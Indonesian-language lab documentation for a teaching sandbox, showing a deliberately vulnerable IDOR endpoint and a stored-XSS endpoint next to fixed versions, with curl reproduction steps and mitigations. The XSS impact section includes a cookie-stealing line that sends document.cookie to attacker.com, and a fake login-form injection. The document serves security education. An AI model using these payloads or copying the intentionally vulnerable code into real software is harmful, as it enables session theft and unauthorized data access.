# ARKAVIA - Dokumentasi Kerentanan & Mitigasi

Dokumen ini menjelaskan dua kerentanan yang sengaja diimplementasikan dalam modul Security Sandbox ARKAVIA untuk tujuan pendidikan. Kedua kerentanan ini diisolasi dari fitur utama aplikasi dan hanya aktif dalam LAB_MODE.

---

## Skenario A: IDOR - Insecure Direct Object Reference

### Definisi

IDOR (Insecure Direct Object Reference) adalah jenis kerentanan kontrol akses yang terjadi ketika aplikasi menggunakan input dari pengguna secara langsung untuk mengakses objek (file, record database, dll.) tanpa memverifikasi apakah pengguna memiliki otorisasi terhadap objek tersebut.

**Klasifikasi OWASP**: A01:2021 - Broken Access Control

### Konteks Lab

**Objek yang diuji**: Submission tugas mahasiswa (lab_submissions #101)

**Pengguna yang terlibat**:
- **Student A - Rael Noctis** (NIM-2024010001): Pemilik sah submission #101
- **Student B - Lyra Voss** (NIM-2024010002): Penguji yang bukan pemilik

**Data sensitif yang ada di submission #101**:
- Nama mahasiswa, judul tugas, nilai (score)
- `secret_note`: Data konfidensial yang seharusnya hanya bisa dibaca oleh pemilik

### Kode Endpoint Vulnerable

```javascript
// GET /api/lab/idor/submission/:id
router.get('/idor/submission/:id', requireAuth, requireLabMode, (req, res) => {
  const db = getDb();
  const submission = db.prepare(
    'SELECT * FROM lab_submissions WHERE id = ?'
  ).get(req.params.id);

  if (!submission) return res.status(404).json({ error: 'Not found' });

  // ⚠️ INTENTIONAL: No ownership check
  // Any authenticated user can access any submission

  res.json({
    mode: 'VULNERABLE',
    submission,  // Returns ALL data including secret_note
  });
});
```

**Masalah**: Endpoint hanya memverifikasi bahwa pengguna sudah login (`requireAuth`), tetapi tidak memverifikasi apakah pengguna yang login adalah pemilik submission.

### Kode Endpoint Safe

```javascript
// GET /api/lab/idor-safe/submission/:id
router.get('/idor-safe/submission/:id', requireAuth, (req, res) => {
  const db = getDb();
  const submission = db.prepare(
    'SELECT * FROM lab_submissions WHERE id = ?'
  ).get(req.params.id);

  if (!submission) return res.status(404).json({ error: 'Not found' });

  // ✅ SAFE: Ownership check
  if (submission.student_id !== req.session.user.id) {
    return res.status(403).json({
      mode: 'SAFE',
      result: 'BLOCKED',
      message: 'Access denied: Ownership check enforced.',
      mitigation: 'Backend verified submission.student_id === session.user.id',
    });
  }

  res.json({ mode: 'SAFE', result: 'ALLOWED', submission });
});
```

**Perbaikan**: Tambahkan pemeriksaan `submission.student_id !== req.session.user.id` sebelum mengembalikan data.

### Cara Mereproduksi

**Prasyarat**: LAB_MODE=true di backend .env

**Langkah 1 - Siapkan sesi Lyra Voss**:
```bash
# Login sebagai Lyra Voss
curl -c lyra-cookies.txt -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"lyra.voss","password":"Student@2026!"}'
```

**Langkah 2 - Uji endpoint vulnerable**:
```bash
curl -b lyra-cookies.txt http://localhost:3001/api/lab/idor/submission/101
```

**Hasil yang diharapkan** (IDOR berhasil):
```json
{
  "mode": "VULNERABLE",
  "warning": "IDOR: No ownership check was performed...",
  "submission": {
    "id": 101,
    "student_id": 5,
    "student_name": "Rael Noctis",
    "assignment_title": "Chain of Custody Analysis",
    "content": "...",
    "score": 88,
    "secret_note": "CONFIDENTIAL: Internal score adjustment note..."
  }
}
```

**Langkah 3 - Uji endpoint safe**:
```bash
curl -b lyra-cookies.txt http://localhost:3001/api/lab/idor-safe/submission/101
```

**Hasil yang diharapkan** (IDOR diblokir):
```
HTTP 403 Forbidden
{
  "mode": "SAFE",
  "result": "BLOCKED",
  "message": "Access denied: Ownership check enforced."
}
```

**Langkah 4 - Verifikasi Rael bisa akses miliknya sendiri**:
```bash
curl -c rael-cookies.txt -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"rael.noctis","password":"Student@2026!"}'

curl -b rael-cookies.txt http://localhost:3001/api/lab/idor-safe/submission/101
# Expected: 200 OK, result: "ALLOWED"
```

### Dampak

Jika IDOR terjadi di aplikasi nyata:

1. **Kebocoran data pribadi**: Mahasiswa dapat membaca jawaban, nilai, dan catatan konfidensial milik mahasiswa lain
2. **Pelanggaran privasi akademik**: Data akademik yang seharusnya rahasia terekspos
3. **Potensi kecurangan**: Mahasiswa dapat membaca submission orang lain untuk ditiru
4. **Skala besar**: Dengan mengiterasi ID (1, 2, 3, ...), semua data dapat dikumpulkan secara massal

### Mitigasi Lengkap

1. **Verifikasi kepemilikan di backend**:
   ```javascript
   if (resource.owner_id !== req.session.user.id) {
     return res.status(403).json({ error: 'Access denied' });
   }
   ```

2. **Jangan percaya ID dari URL sebagai satu-satunya kontrol akses**

3. **Gunakan query yang sudah dibatasi**:
   ```sql
   -- Buruk: ambil semua, periksa di aplikasi
   SELECT * FROM submissions WHERE id = ?

   -- Baik: batasi di query
   SELECT * FROM submissions WHERE id = ? AND student_id = ?
   ```

4. **Log semua percobaan akses** (termasuk yang gagal) untuk deteksi anomali

5. **Terapkan prinsip least privilege**: User hanya boleh mengakses resource yang mereka butuhkan

---

## Skenario B: Stored XSS - Cross-Site Scripting

### Definisi

Stored XSS (Persistent XSS) terjadi ketika input pengguna yang berbahaya disimpan di database tanpa sanitasi, kemudian ditampilkan kembali kepada pengguna lain sebagai HTML mentah. Script yang tersimpan akan dieksekusi di browser setiap pengguna yang melihat konten tersebut.

**Klasifikasi OWASP**: A03:2021 - Injection

### Konteks Lab

**Fitur yang diuji**: Forum komentar (lab_xss_posts)

**Tabel lab**:
- `body`: Konten raw tanpa sanitasi (untuk mode vulnerable)
- `body_safe`: Konten yang sudah di-encode HTML (untuk mode safe)

### Payload yang Digunakan

```html
<script>alert("ARKAVIA XSS LAB: Stored XSS Berhasil Dieksekusi!")</script>
```

Payload ini hanya menampilkan alert dialog. **Tidak ada cookie yang dicuri, tidak ada data yang dikirim ke server eksternal.**

### Kode Endpoint Vulnerable

**Penyimpanan (POST /api/lab/xss/posts)**:
```javascript
router.post('/xss/posts', requireAuth, requireLabMode, (req, res) => {
  const db = getDb();
  const { author_name, body } = req.body;

  // ⚠️ INTENTIONAL: Stored without sanitization
  db.prepare(
    'INSERT INTO lab_xss_posts (author_name, body, body_safe) VALUES (?, ?, ?)'
  ).run(author_name, body, escapeHtml(body));  // body stored RAW

  res.json({ stored_raw: body });
});
```

**Penampilan (GET /api/lab/xss/posts)**:
```javascript
router.get('/xss/posts', requireAuth, requireLabMode, (req, res) => {
  const db = getDb();
  const posts = db.prepare(
    'SELECT id, author_name, body, created_at FROM lab_xss_posts'
  ).all();

  // ⚠️ body is raw, unescaped HTML
  res.json({ mode: 'VULNERABLE', posts });
});
```

**Rendering di frontend** (LabPage.jsx):
```javascript
// ⚠️ DANGEROUS: Renders raw HTML including <script> tags
if (vulnDisplayRef.current) {
  vulnDisplayRef.current.innerHTML = posts.map(p =>
    `<div>${p.author_name}: ${p.body}</div>`
  ).join('');
}
```

**Masalah**: Body disimpan tanpa sanitasi, dikembalikan sebagai raw string, dan di-render via `innerHTML` yang mengeksekusi `<script>` tag.

### Kode Endpoint Safe

**Penyimpanan (POST /api/lab/xss-safe/posts)**:
```javascript
router.post('/xss-safe/posts', requireAuth, (req, res) => {
  const db = getDb();
  const { body } = req.body;

  // ✅ SAFE: Sanitize with DOMPurify before storing
  const safeBody = sanitizeHtml(body);  // DOMPurify strips all tags

  db.prepare(
    'INSERT INTO lab_xss_posts (author_name, body, body_safe) VALUES (?, ?, ?)'
  ).run(author_name, safeBody, safeBody);

  res.json({ sanitized: safeBody });
});
```

**Penampilan (GET /api/lab/xss-safe/posts)**:
```javascript
router.get('/xss-safe/posts', requireAuth, (req, res) => {
  const db = getDb();
  // ✅ Returns body_safe (HTML-encoded)
  const posts = db.prepare(
    'SELECT id, author_name, body_safe as body, created_at FROM lab_xss_posts'
  ).all();

  res.json({ mode: 'SAFE', posts });
});
```

**Rendering di frontend** (React JSX - auto-safe):
```jsx
// ✅ SAFE: React renders as text, not HTML
<span>{post.body}</span>
// Even if body contains <script>, React escapes it automatically
```

### Cara Mereproduksi

**Prasyarat**: LAB_MODE=true

**Langkah 1 - Login**:
```bash
curl -c cookies.txt -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"rael.noctis","password":"Student@2026!"}'
```

**Langkah 2 - Kirim payload ke endpoint vulnerable**:
```bash
curl -b cookies.txt -X POST http://localhost:3001/api/lab/xss/posts \
  -H "Content-Type: application/json" \
  -d '{
    "author_name": "Attacker",
    "body": "<script>alert(\"XSS Executed!\")</script>"
  }'
```

**Langkah 3 - Ambil postingan dari endpoint vulnerable**:
```bash
curl -b cookies.txt http://localhost:3001/api/lab/xss/posts
```

**Hasil yang diharapkan** (raw script tag ada di response):
```json
{
  "mode": "VULNERABLE",
  "posts": [
    {
      "id": 1,
      "author_name": "Attacker",
      "body": "<script>alert(\"XSS Executed!\")</script>",
      "created_at": "2026-10-16T..."
    }
  ]
}
```

Ketika `body` ini di-render via `innerHTML` di browser, script **akan dieksekusi**.

**Langkah 4 - Uji endpoint safe**:
```bash
curl -b cookies.txt http://localhost:3001/api/lab/xss-safe/posts
```

**Hasil yang diharapkan** (script diencoding):
```json
{
  "mode": "SAFE",
  "posts": [
    {
      "body": "&lt;script&gt;alert(&quot;XSS Executed!&quot;)&lt;/script&gt;"
    }
  ]
}
```

Script yang sudah di-encode tidak akan dieksekusi karena browser membacanya sebagai teks literal.

**Langkah 5 - Verifikasi di UI**:
1. Buka http://localhost:5173
2. Login, navigasi ke Security Sandbox
3. Klik "Test XSS Vulnerability" - browser alert akan muncul
4. Klik "Test Safe Rendering" - teks `<script>` tampil sebagai teks biasa

### Dampak di Aplikasi Nyata

Jika Stored XSS terjadi di forum diskusi nyata:

1. **Session Hijacking**:
   ```javascript
   fetch('https://attacker.com/steal?c=' + document.cookie)
   ```
   Cookie session semua pengguna yang melihat forum dapat dicuri.

2. **Credential Phishing**:
   ```javascript
   document.body.innerHTML = '<form>Username: <input> Password: <input type=password></form>';
   ```
   Form login palsu ditampilkan menimpa halaman asli.

3. **Defacement**: Tampilan halaman diubah untuk semua pengguna.

4. **Keylogging**: Script dapat merekam setiap keystroke pengguna.

5. **Redirect ke situs berbahaya**: Pengguna diarahkan ke halaman phishing.

### Mitigasi Lengkap

#### 1. Output Encoding (Paling Penting)

Selalu encode karakter HTML khusus sebelum menampilkan ke browser:

```javascript
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

#### 2. Input Sanitization dengan DOMPurify

Jika HTML tetap diperlukan, gunakan sanitizer yang aman:

```javascript
const DOMPurify = require('dompurify');
const { window } = require('jsdom')('');
const purify = DOMPurify(window);

const safeHtml = purify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
  ALLOWED_ATTR: []
});
```

#### 3. Gunakan React JSX (Bukan innerHTML)

```jsx
// BERBAHAYA
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// AMAN
<div>{userContent}</div>  // React auto-escapes
```

#### 4. Content Security Policy (CSP)

```javascript
// Di helmet.js config
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],  // Blokir inline scripts
      // Tanpa 'unsafe-inline', XSS via <script> tidak akan berjalan
    },
  },
}));
```

#### 5. HttpOnly Cookie

Mencegah script membaca cookie session:
```javascript
cookie: {
  httpOnly: true,  // JavaScript tidak bisa baca cookie ini
  secure: true,    // Hanya HTTPS
}
```

---

## Perbandingan Kerentanan

| Aspek | IDOR | Stored XSS |
|-------|------|------------|
| Kategori OWASP | A01 - Broken Access Control | A03 - Injection |
| Vektor | URL parameter manipulation | Input form/API |
| Target | Data rahasia pengguna lain | Browser korban |
| Persistensi | Tidak (per request) | Ya (tersimpan di DB) |
| Cakupan | Satu user per request | Semua user yang melihat konten |
| Deteksi | Mudah di audit log | Lebih sulit |
| Mitigasi utama | Ownership check di backend | Output encoding + CSP |

---

## Daftar Endpoint Lab

| Endpoint | Mode | LAB_MODE Required |
|----------|------|-------------------|
| GET /api/lab/status | Info | Tidak |
| GET /api/lab/idor/info | Info | Tidak |
| GET /api/lab/idor/submission/:id | VULNERABLE | Ya |
| GET /api/lab/idor-safe/submission/:id | SAFE | Tidak |
| GET /api/lab/xss/info | Info | Tidak |
| GET /api/lab/xss/posts | VULNERABLE | Ya |
| POST /api/lab/xss/posts | VULNERABLE | Ya |
| GET /api/lab/xss-safe/posts | SAFE | Tidak |
| POST /api/lab/xss-safe/posts | SAFE | Tidak |

---

## Referensi

- OWASP Top 10: https://owasp.org/Top10/
- OWASP IDOR Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- DOMPurify: https://github.com/cure53/DOMPurify
- Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
